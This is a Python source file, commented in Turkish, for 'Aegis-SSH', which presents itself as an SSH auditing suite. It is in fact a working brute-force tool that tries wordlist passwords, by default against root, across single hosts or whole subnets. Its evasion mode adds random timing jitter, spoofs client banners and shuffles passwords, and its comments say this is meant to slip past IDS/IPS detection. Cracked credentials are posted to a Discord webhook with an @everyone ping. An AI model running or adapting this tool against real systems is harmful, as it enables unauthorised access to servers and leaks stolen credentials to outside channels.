"""
Aegis-SSH Auditing Suite
Bu modül, kurumsal ağlarda zayıf SSH yapılandırmalarını tespit etmek amacıyla
geliştirilmiş asenkron tabanlı bir güvenlik denetim aracıdır.
"""

import asyncio
import asyncssh
import sys
import os
import random
import time
import json
import urllib.request
import socket
import ipaddress
from datetime import datetime
from colorama import init, Fore, Style

# Terminaldeki renk kodlarının Windows dahil her ortamda sıfırlanmasını sağlar
init(autoreset=True)

def clear_screen():
    """
    İşletim sistemine göre terminal ekranını temizler.
    Windows için 'cls', Linux/Mac için 'clear' komutunu kullanır.
    """
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """
    Aracın başlangıcında gösterilecek ASCII sanatı ve versiyon
    bilgilerini terminale yazdırır.
    """
    clear_screen()
    logo = f"""{Fore.CYAN}
    █████╗ ███████╗ ██████╗ ██╗███████╗       ███████╗███████╗██╗  ██╗
   ██╔══██╗██╔════╝██╔════╝ ██║██╔════╝       ██╔════╝██╔════╝██║  ██║
   ███████║█████╗  ██║  ███╗██║███████╗ █████╗███████╗███████╗███████║
   ██╔══██║██╔══╝  ██║   ██║██║╚════██║ ╚════╝╚════██║╚════██║██╔══██║
   ██║  ██║███████╗╚██████╔╝██║███████║       ███████║███████║██║  ██║
   ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚══════╝       ╚══════╝╚══════╝╚═╝  ╚═╝
    {Style.RESET_ALL}"""
    print(logo)
    print(f"{Fore.YELLOW}[+] Asenkron SSH Güvenlik Denetim Aracı v5.0 (Pro){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Aktif Modüller: Brute-Force, Evasion, Subnet Scan, DNS Resolve, Session Resume{Style.RESET_ALL}\n")

# --- Webhook ---
def send_discord_webhook(webhook_url, target_ip, port, mode, status, creds, total_tested, banner_info):
    """
    Tarama sonuçlarını belirtilen Discord Webhook adresine iletir.
    Duruma göre (Güvenli/Zafiyet) farklı renklerde 'embed' mesaj oluşturur ve
    önemli bildirimlerin herkes tarafından görülmesi için kanala duyuru düşer.
    """
    if not webhook_url: return
    
    # Duruma göre embed rengini ayarla: Güvenli ise yeşil, Zafiyet ise kırmızı
    color = 65280 if status == "GÜVENLİ" else 16711680
    desc = f"**Hedef:** {target_ip}:{port}\n**Banner:** {banner_info}\n**Modül:** {mode}\n**Denenen Şifre:** {total_tested}\n\n"
    
    if status == "ZAFİYET":
        desc += f"**[!] TESPİT EDİLEN BİLGİLER:**\n```\n{creds}\n```"
    else:
        desc += "Hiçbir zafiyet veya zayıf şifre tespit edilemedi."
        
    # 'content: @everyone' parametresi ile discord kanalındaki herkese bildirim (ping) gitmesi sağlanır
    data = {
        "content": "@everyone", 
        "username": "Güvenlik Denetim Botu", 
        "embeds": [{"title": f"SSH Denetim Sonucu: {status}", "description": desc, "color": color}]
    }
    
    # Discord API'sine POST isteği gönder
    req = urllib.request.Request(webhook_url, data=json.dumps(data).encode('utf-8'), headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
    try:
        urllib.request.urlopen(req, timeout=5)
    except:
        pass # Webhook hatası ana taramayı kesintiye uğratmamalı

# --- Network Utilities ---
def resolve_target(target):
    """
    Kullanıcının girdiği hedefi analiz eder. Eğer bir alt ağ (subnet) girilmişse IP listesi üretir,
    tek bir IP veya alan adı girilmişse bunu çözümleyerek listeye ekler.
    """
    try:
        if '/' in target:
            # CIDR formatındaki alt ağı parse ederek kullanılabilir host'ları çıkarır
            return [str(ip) for ip in list(ipaddress.IPv4Network(target, strict=False).hosts())]
        return [socket.gethostbyname(target)] # DNS çözünürlüğü veya Tek IP
    except Exception as e:
        print(f"[{Fore.RED}HATA{Style.RESET_ALL}] Hedef çözümlenemedi: {e}")
        return []

async def check_port_and_banner(ip, port):
    """
    Belirtilen IP ve Port üzerinde SSH servisinin açık olup olmadığını kontrol eder.
    Açık ise bağlantı kurarak SSH versiyon banner'ını (örn: OpenSSH_8.4p1) çeker.
    """
    try:
        # Bağlantı için 2 saniyelik bir zaman aşımı (timeout) belirlenir
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2.0)
        banner = await asyncio.wait_for(reader.readline(), timeout=2.0)
        writer.close()
        await writer.wait_closed()
        
        b_str = banner.decode('utf-8', errors='ignore').strip()
        return b_str if b_str else "Bilinmeyen Servis (Unrecognized Banner)"
    except:
        return None # Port kapalıysa veya yanıt vermiyorsa None döner

# --- Session Management ---
SESSION_FILE = "session.json"

def save_session(targets, current_ip_idx, wordlist_path, current_word_idx, mode_num, webhook, threads, username, port):
    """
    Taramanın beklenmedik şekilde kesilmesi durumunda veya manuel durdurmalarda
    mevcut durumu JSON dosyasına kaydeder (Kayıp Önleyici Oturum Yönetimi).
    """
    data = {"targets": targets, "current_ip_idx": current_ip_idx, "wordlist": wordlist_path, 
            "current_word_idx": current_word_idx, "mode_num": mode_num, "webhook": webhook, 
            "threads": threads, "username": username, "port": port}
    try:
        with open(SESSION_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f)
    except:
        pass

def load_session():
    """Kaydedilmiş bir oturum dosyası varsa, içindeki verileri okuyup geri döndürür."""
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except: pass
    return None

def clear_session():
    """Tarama başarıyla tamamlandığında artık ihtiyaç kalmayan oturum dosyasını siler."""
    if os.path.exists(SESSION_FILE):
        try: os.remove(SESSION_FILE)
        except: pass

# --- Core Engine ---
async def attempt_login(ip, port, username, password, semaphore, is_stealth=False):
    """
    Asenkron olarak SSH denemesi gerçekleştirir.
    Eğer Evasion (Kaçınma) modu aktifse araya rastgele beklemeler (Jitter) ekler.
    """
    async with semaphore:
        client_version = "SSH-2.0-OpenSSH_8.4p1" # Varsayılan istemci banner'ı
        
        # IPS/IDS sistemlerini atlatmak için zamanlama ve imza manipülasyonu
        if is_stealth:
            jitter = random.uniform(1.5, 5.5)
            if random.random() < 0.15: jitter += random.uniform(10.0, 25.0) # Rastgele uzun beklemeler
            await asyncio.sleep(jitter)
            
            # İstemci sahteciliği (Fingerprint Spoofing)
            client_versions = ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1", "SSH-2.0-OpenSSH_9.0", "SSH-2.0-PuTTY_Release_0.76", "SSH-2.0-WinSCP_release_5.19"]
            client_version = random.choice(client_versions)
            
        try:
            print(f"[*] {ip} Deneniyor -> {Fore.CYAN}{username}{Style.RESET_ALL} : {Fore.CYAN}{password}{Style.RESET_ALL}")
            
            # asyncssh kütüphanesinin gereksiz uyarılarını gizle
            asyncssh.set_log_level('CRITICAL')
            async with asyncssh.connect(
                ip, port=port, username=username, password=password,
                known_hosts=None, client_keys=None, login_timeout=5.0,
                client_version=client_version
            ) as conn:
                print(f"\n[{Fore.GREEN}BAŞARILI{Style.RESET_ALL}] Sistem Erişimi Sağlandı: {ip}")
                print(f" └── Kullanıcı: {Fore.GREEN}{username}{Style.RESET_ALL} | Şifre: {Fore.RED}{password}{Style.RESET_ALL}\n")
                return password # Giriş başarılıysa kırılan şifreyi döndür
        except:
            return None # Auth failed, Timeout, Connection Refused hatalarında None döner

async def run_brute_force_for_ip(ip, port, username, passwords_to_test, threads, is_stealth=False):
    """
    Belirli bir IP adresi için asenkron görevleri (tasks) oluşturur ve eşzamanlı olarak yürütür.
    asyncio.Semaphore kullanılarak işletim sistemi kaynaklarının (socket vb.) tükenmesi önlenir.
    """
    semaphore = asyncio.Semaphore(threads)
    tasks = [attempt_login(ip, port, username, p, semaphore, is_stealth) for p in passwords_to_test]
    results = await asyncio.gather(*tasks)
    return [r for r in results if r is not None] # Sadece başarılı girişleri filtreler

# --- Main Flow ---
async def main():
    """
    Aracın ana akışını yöneten fonksiyon. Kullanıcıdan girdileri alır, 
    hedefleri belirler, tarama döngüsünü başlatır ve sonunda HTML raporu üretir.
    """
    print_banner()
    
    # Önceki oturum değişkenlerini başlat
    session = load_session()
    targets = []
    current_ip_idx = 0
    current_word_idx = 0
    mode_num = '1'
    threads = 10
    discord_webhook = ""
    username = "root"
    wordlist = ""
    port = 22

    # UI Modülü: Kullanıcı Tercihleri
    print(f"\n{Fore.CYAN}--- Operasyon Modülü Seçimi ---{Style.RESET_ALL}")
    print("  1) Agresif Brute-Force (Maksimum hız, yüksek algılanma riski)")
    print("  2) Evasion Mode (Zamanlama manipülasyonu ile gizlilik)")
    if session:
        print(f"  3) {Fore.GREEN}Kaldığı Yerden Devam Et (Önceki oturumu yükle){Style.RESET_ALL}")

    mode_num = input(f"\n  [{Fore.YELLOW}?{Style.RESET_ALL}] Lütfen bir Mod Seçin: ").strip()

    # Session Resume (Kaldığı yerden devam etme) Mantığı
    if session and mode_num == '3':
        targets = session.get("targets", [])
        current_ip_idx = session.get("current_ip_idx", 0)
        wordlist = session.get("wordlist", "")
        current_word_idx = session.get("current_word_idx", 0)
        mode_num = session.get("mode_num", "1")
        discord_webhook = session.get("webhook", "")
        threads = session.get("threads", 10)
        username = session.get("username", "root")
        port = session.get("port", 22)
        print(f"\n[{Fore.GREEN}+{Style.RESET_ALL}] Eski oturum yüklendi: Toplam {len(targets)} Hedef, Liste Konumu: {current_word_idx} ({targets[current_ip_idx]} makinesinden devam)...\n")
    
    # Yeni Tarama Başlatma Akışı
    elif mode_num in ['1', '2']:
        print(f"\n{Fore.CYAN}--- Hedef Belirleme ---{Style.RESET_ALL}")
        print("Hedefinizi aşağıdaki 3 formattan biriyle girebilirsiniz:")
        print(f"  {Fore.YELLOW}-{Style.RESET_ALL} Tek IP Adresi     : Örn -> 192.168.1.10")
        print(f"  {Fore.YELLOW}-{Style.RESET_ALL} Alan Adı (Domain) : Örn -> firmaadi.com")
        print(f"  {Fore.YELLOW}-{Style.RESET_ALL} Alt Ağ (Subnet)   : Örn -> 192.168.1.0/24")
        
        target_input = input(f"\n  [{Fore.YELLOW}?{Style.RESET_ALL}] Hedefi Girin: ").strip()
        if not target_input: sys.exit()
        
        targets = resolve_target(target_input)
        if not targets: sys.exit(1)
        print(f"[*] Toplam {len(targets)} geçerli IP adresi çözümlendi.")

        port_input = input(f"  [{Fore.YELLOW}?{Style.RESET_ALL}] Hedef Port (Varsayılan: 22): ").strip()
        port = int(port_input) if port_input.isdigit() else 22
        
        username = input(f"\n  [{Fore.YELLOW}?{Style.RESET_ALL}] Hedef Kullanıcı Adı (Örn: root) : ").strip() or "root"
        wordlist = input(f"  [{Fore.YELLOW}?{Style.RESET_ALL}] Şifre Listesi Dosya Yolu      : ").strip().strip('"').strip("'")
        
        use_wh = input(f"  [{Fore.YELLOW}?{Style.RESET_ALL}] Sonuçlar Discord Webhook'a iletilsin mi? (e/h): ").strip().lower()
        if use_wh == 'e':
            discord_webhook = input(f"  [{Fore.YELLOW}?{Style.RESET_ALL}] Discord Webhook URL: ").strip()

        # Agresif modda asenkron iş parçacığı (thread) ayarı, evasion modda ise zorunlu 1 (tekil deneme)
        if mode_num == '1':
            t_in = input(f"  [{Fore.YELLOW}?{Style.RESET_ALL}] Eşzamanlı Bağlantı (Varsayılan: 10): ").strip()
            threads = int(t_in) if t_in.isdigit() else 10
        else:
            threads = 1 # Evasion Modu Maksimum Gizlilik İçin
            
    else:
        print(f"\n[{Fore.RED}HATA{Style.RESET_ALL}] Geçersiz bir seçim yaptınız. Çıkılıyor.")
        sys.exit(1)

    # Şifre listesi (wordlist) dosyasını doğrulama
    if not os.path.isfile(wordlist):
        print(f"[{Fore.RED}HATA{Style.RESET_ALL}] Geçersiz şifre dosyası veya dizin girdiniz: {wordlist}")
        sys.exit(1)

    try:
        with open(wordlist, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[{Fore.RED}HATA{Style.RESET_ALL}] Dosya okunurken hata: {e}")
        sys.exit(1)

    if not passwords:
        print(f"[{Fore.RED}HATA{Style.RESET_ALL}] Şifre dosyası boş! Lütfen içine şifre kombinasyonları ekleyip tekrar deneyin.")
        sys.exit(1)

    is_stealth = (mode_num == '2')
    mode_name = "Advanced Evasion Profile" if is_stealth else "Agresif Brute-Force"

    # Evasion modunda pattern (desen) analizi yememek için şifreleri karıştırır
    if is_stealth and current_word_idx == 0:
        random.shuffle(passwords)
        print(f"[*] Desen analizinden kaçınmak için şifre listesi karıştırıldı.")

    print(f"\n{Fore.MAGENTA}📁 {mode_name} Başlatılıyor...{Style.RESET_ALL}")
    
    html_reports = []
    ip_idx = current_ip_idx

    # Ana Tarama Döngüsü
    try:
        for ip_idx in range(current_ip_idx, len(targets)):
            target_ip = targets[ip_idx]
            
            print(f"\n[*] {target_ip} için bağlantı kontrolü yapılıyor...")
            banner = await check_port_and_banner(target_ip, port)
            
            # Port kapalıysa bir sonraki IP'ye atla ve oturumu güncelle
            if not banner:
                print(f"[{Fore.YELLOW}ATLANDI{Style.RESET_ALL}] {target_ip}:{port} kapalı veya yanıt vermiyor.")
                current_word_idx = 0
                save_session(targets, ip_idx + 1, wordlist, 0, mode_num, discord_webhook, threads, username, port)
                continue
                
            print(f"[{Fore.GREEN}AÇIK{Style.RESET_ALL}] {target_ip}:{port} erişilebilir! Tespit Edilen Banner: {Fore.CYAN}{banner}{Style.RESET_ALL}")
            
            # Tarama sürecini başlat (kaldığı indeksten itibaren)
            passwords_to_test = passwords[current_word_idx:]
            valid_creds = await run_brute_force_for_ip(target_ip, port, username, passwords_to_test, threads, is_stealth)
            
            # Raporlama Değişkenleri
            rep_status = "ZAFİYET" if valid_creds else "GÜVENLİ"
            rep_str = "<br>".join([f"{username} : {p}" for p in valid_creds]) if valid_creds else "Bulunamadı"
            discord_creds = "\n".join([f"{username} : {p}" for p in valid_creds]) if valid_creds else "Bulunamadı"
            
            # HTML Verilerini Hazırla
            html_reports.append(f"<h3>{target_ip} - Banner: {banner}</h3><p>Sonuç: <span style='color:{'red' if valid_creds else 'green'}'>{rep_status}</span></p><p>Tespit: {rep_str}</p><hr>")
            
            # Sonucu Discord'a ilet
            if discord_webhook:
                send_discord_webhook(discord_webhook, target_ip, port, mode_name, rep_status, discord_creds, len(passwords_to_test), banner)
            
            # Tarama bitince bir sonraki hedef için oturumu sıfırla ve kaydet
            current_word_idx = 0 
            save_session(targets, ip_idx + 1, wordlist, 0, mode_num, discord_webhook, threads, username, port)

        # Tüm liste bitince session dosyasını temizle
        clear_session()
        print(f"\n{Fore.CYAN}--- Tüm Tarama İşlemi Tamamlandı ---{Style.RESET_ALL}")
        
        # Dinamik HTML Raporu Üretimi
        if html_reports:
            report_filename = f"rapor_genel_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
            full_html = f"<html><head><title>Toplu Denetim Raporu</title><meta charset='utf-8'></head><body style='font-family: Arial; margin:40px; background-color: #f4f4f9;'><div style='background-color: white; padding: 20px; border-radius: 8px;'><h1 style='color:#333;'>Güvenlik Denetim Raporu</h1><p><strong>Tarih:</strong> {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}</p><hr>" + "".join(html_reports) + "</div></body></html>"
            with open(report_filename, "w", encoding="utf-8") as rf:
                rf.write(full_html)
            print(f"[{Fore.GREEN}+{Style.RESET_ALL}] Detaylı Ağ Raporu Kaydedildi: {Fore.YELLOW}{report_filename}{Style.RESET_ALL}")

    # Acil Durum Çıkışı (Ctrl+C)
    except KeyboardInterrupt:
        print(f"\n\n[{Fore.RED}DURDURULDU{Style.RESET_ALL}] Kullanıcı `CTRL+C` ile işlemi iptal etti.")
        save_session(targets, ip_idx, wordlist, current_word_idx, mode_num, discord_webhook, threads, username, port)
        print(f"[{Fore.YELLOW}*{Style.RESET_ALL}] Kaldığınız yer (session.json) başarıyla kaydedildi! Programı tekrar açtığınızda kaldığınız '{targets[ip_idx]}' makinesinden devam edebilirsiniz.")

# Script doğrudan çalıştırıldığında tetiklenecek başlangıç noktası
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
